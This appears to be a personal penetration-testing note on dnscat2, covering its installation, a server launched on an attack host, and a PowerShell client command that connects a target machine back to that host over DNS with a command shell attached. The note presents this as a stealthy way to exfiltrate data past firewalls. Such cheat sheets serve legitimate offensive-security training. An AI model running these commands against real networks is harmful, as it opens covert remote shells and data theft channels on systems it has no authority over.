```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[Dnscat2](https://github.com/iagox86/dnscat2) is a tunnelling tool that uses the [[DNS]] protocol to encapsulate the traffic. It uses an encrypted *command & control* (*C2*) channel to send data inside TXT records. Pretty much any [[Active Directory]] domain will its own DNS server that will rout traffic to external DNS servers participating in the internet's DNS system. However, with `dnscat2`, the address resolution is requested from an external server. This means that when a local DNS within the network tries to resolve an address, data is exfiltrated and sent in place of legitimate DNS requests.

*This is a really stealthy approach to exfiltrate data while evading firewall detections which sniff the traffic and strip the HTTPS connections*. We can host the `dnscat2` server on our attack machine and execute the client on the target server.
## Installation
```
git clone https://github.com/iagox86/dnscat2.git

git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

## Documentation
**Cheatsheet:** 
**Website:** 
- https://github.com/iagox86/dnscat2
- https://github.com/lukebaggett/dnscat2-powershell.git
## Usage
### Start the DNS server (on the attack host)
```bash
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```
Start the server, this will give us a secret key that will be used by the clients to encrypt
```bash
sudo ruby dnscat2.rb --dns host=<attack_ip>,port=53,domain=<our_domain_name/domain_to_impersonate> --no-cache
```

### Start the client on the target
> example uses powershell client
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <attack_ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd
```

### Sending commands to the client
> These commands are run, from the server, after a connection has been established
#### Display the help & available options
```batch
?

* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
#### Interacting with the established session
```batch
:: Create a new interactive window
window -i 1
```
> Anything written in this session will be sent 'as-is' to the client to execute. Anything typed on the client or printed will be displayed 'as-is' on the screen.